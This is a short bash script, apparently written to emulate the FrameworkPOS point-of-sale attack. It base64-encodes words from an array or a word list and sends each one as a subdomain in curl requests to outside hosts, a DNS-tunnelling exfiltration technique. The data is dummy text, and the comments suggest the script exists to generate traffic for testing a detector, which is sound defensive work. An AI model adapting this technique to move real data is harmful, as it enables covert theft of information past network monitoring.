# /bin/bash

# Simple script to encode a message into the url and do a dns query. Made to emulate frameworkpos attack
strings=(This1
	is1
	the1
	message1
	to1
	be1
	exfiltrated,1
	I1
	both1
	hope1
	that1
	it1
	will1
	work1
	and1
	hope1
	that1
	it1
	doesnt1
	work1
	just1
	making1
	more1
	data1
	for1
	the1
	dns1
	to1
	keep1
	sending1
	incredibly1
	long1
	sentences1
	and1
	just1
	trying1
	in1
	general1
	to1
	create1
	examples1
	that1
	it1
	cannot1
	catch1
	im1
	certain1
	it1
	can1
	catch1
	this1
	example1
	but1
	if1
	i1
	encode1
	this1
	in1
	a1
	smart1
	thecyber
	interest
	of
	mosttopics
	arestuck
	in
	this
	kind
	of
	rut
	whatever
	the
	caseis
	theharddisk
	must
	remain
	withus
	)
#for i in "${strings[@]}"; do
#	curl `echo "$i" | base64`.tunnel.yellowsubmarines.ga
#	sleep 10
#done
cat words_alpha.txt | while read word
do
	curl `echo "$word" | base64`.simple_encoded.com
	sleep 5
done
